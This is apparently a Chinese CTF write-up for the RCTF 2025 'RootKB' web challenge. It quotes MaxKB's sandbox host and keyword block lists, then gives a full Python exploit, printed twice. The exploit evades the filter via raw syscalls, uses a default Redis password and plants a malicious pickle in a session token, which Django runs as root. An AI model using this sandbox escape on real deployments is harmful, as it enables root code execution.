---
title: "RCTF2025 web"
description: "RCTF 2025 Web方向比赛WP，整理解题思路、关键利用点和赛后复盘记录。"
pubDate: "2026-05-01"
updatedDate: "2026-05-01"
tags: ["CTF", "Web安全", "WP"]
cover: auto
coverAlt: "RCTF2025 web 的文章封面"
draft: false
---
### RootKB

```
MAXKB_SANDBOX_PYTHON_BANNED_HOSTS="127.0.0.1,localhost,host.docker.internal,maxkb,pgsql,redis"
MAXKB_SANDBOX_PYTHON_BANNED_KEYWORDS="subprocess.,system(,exec(,execve(,pty.,eval(,compile(,shutil.,input(,__import__"
```

我们看到了以上的黑名单，发现想要通过socket实现waf绕过不可取，但是并没有封禁我们使用syscall进行底层绕过，然后后面的步骤就是连上redis，然后登录上之后改token利用Django来写flag到一个文件夹下，然后再获取flag,所有过程全部集中到一个脚本中，需要使用两次

```python
def pwn():
    import socket, ctypes, struct, os

    libc = ctypes.CDLL(None, use_errno=True)
    SYS_SOCKET = 41
    SYS_CONNECT = 42
    AF_INET = socket.AF_INET
    SOCK_STREAM = socket.SOCK_STREAM

    # -------- syscall 版 connect，复用你之前成功的写法 --------
    def sys_connect(host, port):
        fd = libc.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)
        if fd < 0:
            return None, {"step": "socket", "errno": ctypes.get_errno()}
        sin_port = socket.htons(port)
        sin_addr = socket.inet_aton(host)
        packed = struct.pack("HH4s8x", AF_INET, sin_port, sin_addr)
        addr = ctypes.create_string_buffer(packed, len(packed))
        ret = libc.syscall(SYS_CONNECT, fd, addr, ctypes.c_uint32(len(packed)))
        if ret != 0:
            err = ctypes.get_errno()
            os.close(fd)
            return None, {"step": "connect", "errno": err}
        s = socket.fromfd(fd, AF_INET, SOCK_STREAM)
        os.close(fd)
        s.settimeout(3.0)
        return s, None

    # -------- Redis 命令：每次建立新连接 + AUTH --------
    def redis_cmd(args):
        s, err = sys_connect("127.0.0.1", 6379)
        if s is None:
            return None, err
        try:
            def enc(parts):
                buf = b"*" + str(len(parts)).encode() + b"\r\n"
                for p in parts:
                    if isinstance(p, str):
                        b = p.encode()
                    else:
                        b = p
                    buf += b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"
                return buf

            # 先 AUTH（官方镜像默认）
            s.sendall(enc(["AUTH", "Password123@redis"]))
            try:
                _ = s.recv(1024)
            except Exception:
                pass

            # 再发真正的命令
            s.sendall(enc(args))
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
            return data, None
        finally:
            try:
                s.close()
            except Exception:
                pass

    # 1. 找 :TOKEN:* 这个 key
    resp, err = redis_cmd(["KEYS", ":TOKEN*"])
    if resp is None:
        return {"ok": False, "stage": "keys", "error": err}
    txt = resp.decode("latin1", "ignore")
    pos = txt.find(":TOKEN:")
    if pos == -1:
        return {"ok": False, "stage": "no_token_key", "raw": txt[:200]}
    end = txt.find("\r\n", pos)
    if end == -1:
        return {"ok": False, "stage": "parse_key", "raw": txt[:200]}
    token_key = txt[pos:end]

    # key 类似 :TOKEN:<token_str>，取后半段当真正 token
    try:
        token_str = token_key.split(":TOKEN:", 1)[1]
    except Exception:
        return {"ok": False, "stage": "split_token", "token_key": token_key}

    # 2. 用恶意 pickle 覆盖这个 key 的 value
    # 载荷逻辑（在 Django / root 进程里反序列化执行）：
    #   data = open("/root/flag","r").read()
    #   open("/opt/maxkb-app/sandbox/pwned_flag","w").write(data)
    hex_payload = (
        "800595a0000000000000008c086275696c74696e73948c04657865639493948c"
        "84696d706f7274206275696c74696e732c6f730a64617461203d206275696c74"
        "696e732e6f70656e28222f726f6f742f666c6167222c227222292e7265616428"
        "290a6275696c74696e732e6f70656e28222f6f70742f6d61786b622d6170702f"
        "73616e64626f782f70776e65645f666c6167222c227722292e77726974652864"
        "617461290a94859452942e"
    )
    payload_bytes = bytes.fromhex(hex_payload)

    set_resp, err2 = redis_cmd(["SET", token_key, payload_bytes])
    if set_resp is None:
        return {"ok": False, "stage": "set_token", "error": err2}
    set_text = set_resp.decode("latin1", "ignore")[:100]

    # 3. syscall 打 8080，用 token 触发 Django 反序列化
    def http_trigger(path, header_line):
        s, err3 = sys_connect("127.0.0.1", 8080)
        if s is None:
            return {"path": path, "header": header_line.split(":", 1)[0], "error": err3}
        try:
            req = (
                "GET {p} HTTP/1.1\r\n"
                "Host: 127.0.0.1:8080\r\n"
                "{h}\r\n"
                "Connection: close\r\n\r\n"
            ).format(p=path, h=header_line)
            s.sendall(req.encode("ascii", "ignore"))
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
            line = data.split(b"\r\n", 1)[0].decode("latin1", "ignore")
            parts = line.split(" ")
            code = None
            if len(parts) >= 2 and parts[1].isdigit():
                code = int(parts[1])
            return {"path": path, "header": header_line.split(":", 1)[0], "status": code}
        finally:
            try:
                s.close()
            except Exception:
                pass

    headers = [
        "Authorization: " + token_str,
        "Authorization: Token " + token_str,
        "Cookie: token=" + token_str,
        "Cookie: auth=" + token_str,
    ]
    http_results = []
    for pth in ["/admin/", "/admin/api/workspace/current_user"]:
        for h in headers:
            http_results.append(http_trigger(pth, h))

    # 4. 读 root 进程写出来的 flag 文件
    flag_path = "/opt/maxkb-app/sandbox/pwned_flag"
    if os.path.exists(flag_path):
        try:
            with open(flag_path, "r") as f:
                flag = f.read().strip()
        except Exception as e:
            return {
                "ok": False,
                "stage": "read_flag_error",
                "flag_path": flag_path,
                "error": repr(e),
                "token_key": token_key,
                "token_str_head": token_str[:64],
                "set_reply": set_text,
                "http": http_results,
            }
        return {
            "ok": True,
            "stage": "done",
            "flag": flag,
            "token_key": token_key,
            "token_str_head": token_str[:64],
            "set_reply": set_text,
            "http": http_results,
        }
    else:
        return {
            "ok": False,
            "stage": "flag_not_written",
            "flag_path": flag_path,
            "token_key": token_key,
            "token_str_head": token_str[:64],
            "set_reply": set_text,
            "http": http_results,
        }
```


### RootKB--


同上

```python
def pwn():
    import socket, ctypes, struct, os

    libc = ctypes.CDLL(None, use_errno=True)
    SYS_SOCKET = 41
    SYS_CONNECT = 42
    AF_INET = socket.AF_INET
    SOCK_STREAM = socket.SOCK_STREAM

    # -------- syscall 版 connect，复用你之前成功的写法 --------
    def sys_connect(host, port):
        fd = libc.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)
        if fd < 0:
            return None, {"step": "socket", "errno": ctypes.get_errno()}
        sin_port = socket.htons(port)
        sin_addr = socket.inet_aton(host)
        packed = struct.pack("HH4s8x", AF_INET, sin_port, sin_addr)
        addr = ctypes.create_string_buffer(packed, len(packed))
        ret = libc.syscall(SYS_CONNECT, fd, addr, ctypes.c_uint32(len(packed)))
        if ret != 0:
            err = ctypes.get_errno()
            os.close(fd)
            return None, {"step": "connect", "errno": err}
        s = socket.fromfd(fd, AF_INET, SOCK_STREAM)
        os.close(fd)
        s.settimeout(3.0)
        return s, None

    # -------- Redis 命令：每次建立新连接 + AUTH --------
    def redis_cmd(args):
        s, err = sys_connect("127.0.0.1", 6379)
        if s is None:
            return None, err
        try:
            def enc(parts):
                buf = b"*" + str(len(parts)).encode() + b"\r\n"
                for p in parts:
                    if isinstance(p, str):
                        b = p.encode()
                    else:
                        b = p
                    buf += b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"
                return buf

            # 先 AUTH（官方镜像默认）
            s.sendall(enc(["AUTH", "Password123@redis"]))
            try:
                _ = s.recv(1024)
            except Exception:
                pass

            # 再发真正的命令
            s.sendall(enc(args))
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
            return data, None
        finally:
            try:
                s.close()
            except Exception:
                pass

    # 1. 找 :TOKEN:* 这个 key
    resp, err = redis_cmd(["KEYS", ":TOKEN*"])
    if resp is None:
        return {"ok": False, "stage": "keys", "error": err}
    txt = resp.decode("latin1", "ignore")
    pos = txt.find(":TOKEN:")
    if pos == -1:
        return {"ok": False, "stage": "no_token_key", "raw": txt[:200]}
    end = txt.find("\r\n", pos)
    if end == -1:
        return {"ok": False, "stage": "parse_key", "raw": txt[:200]}
    token_key = txt[pos:end]

    # key 类似 :TOKEN:<token_str>，取后半段当真正 token
    try:
        token_str = token_key.split(":TOKEN:", 1)[1]
    except Exception:
        return {"ok": False, "stage": "split_token", "token_key": token_key}

    # 2. 用恶意 pickle 覆盖这个 key 的 value
    # 载荷逻辑（在 Django / root 进程里反序列化执行）：
    #   data = open("/root/flag","r").read()
    #   open("/opt/maxkb-app/sandbox/pwned_flag","w").write(data)
    hex_payload = (
        "800595a0000000000000008c086275696c74696e73948c04657865639493948c"
        "84696d706f7274206275696c74696e732c6f730a64617461203d206275696c74"
        "696e732e6f70656e28222f726f6f742f666c6167222c227222292e7265616428"
        "290a6275696c74696e732e6f70656e28222f6f70742f6d61786b622d6170702f"
        "73616e64626f782f70776e65645f666c6167222c227722292e77726974652864"
        "617461290a94859452942e"
    )
    payload_bytes = bytes.fromhex(hex_payload)

    set_resp, err2 = redis_cmd(["SET", token_key, payload_bytes])
    if set_resp is None:
        return {"ok": False, "stage": "set_token", "error": err2}
    set_text = set_resp.decode("latin1", "ignore")[:100]

    # 3. syscall 打 8080，用 token 触发 Django 反序列化
    def http_trigger(path, header_line):
        s, err3 = sys_connect("127.0.0.1", 8080)
        if s is None:
            return {"path": path, "header": header_line.split(":", 1)[0], "error": err3}
        try:
            req = (
                "GET {p} HTTP/1.1\r\n"
                "Host: 127.0.0.1:8080\r\n"
                "{h}\r\n"
                "Connection: close\r\n\r\n"
            ).format(p=path, h=header_line)
            s.sendall(req.encode("ascii", "ignore"))
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
            line = data.split(b"\r\n", 1)[0].decode("latin1", "ignore")
            parts = line.split(" ")
            code = None
            if len(parts) >= 2 and parts[1].isdigit():
                code = int(parts[1])
            return {"path": path, "header": header_line.split(":", 1)[0], "status": code}
        finally:
            try:
                s.close()
            except Exception:
                pass

    headers = [
        "Authorization: " + token_str,
        "Authorization: Token " + token_str,
        "Cookie: token=" + token_str,
        "Cookie: auth=" + token_str,
    ]
    http_results = []
    for pth in ["/admin/", "/admin/api/workspace/current_user"]:
        for h in headers:
            http_results.append(http_trigger(pth, h))

    # 4. 读 root 进程写出来的 flag 文件
    flag_path = "/opt/maxkb-app/sandbox/pwned_flag"
    if os.path.exists(flag_path):
        try:
            with open(flag_path, "r") as f:
                flag = f.read().strip()
        except Exception as e:
            return {
                "ok": False,
                "stage": "read_flag_error",
                "flag_path": flag_path,
                "error": repr(e),
                "token_key": token_key,
                "token_str_head": token_str[:64],
                "set_reply": set_text,
                "http": http_results,
            }
        return {
            "ok": True,
            "stage": "done",
            "flag": flag,
            "token_key": token_key,
            "token_str_head": token_str[:64],
            "set_reply": set_text,
            "http": http_results,
        }
    else:
        return {
            "ok": False,
            "stage": "flag_not_written",
            "flag_path": flag_path,
            "token_key": token_key,
            "token_str_head": token_str[:64],
            "set_reply": set_text,
            "http": http_results,
        }
```
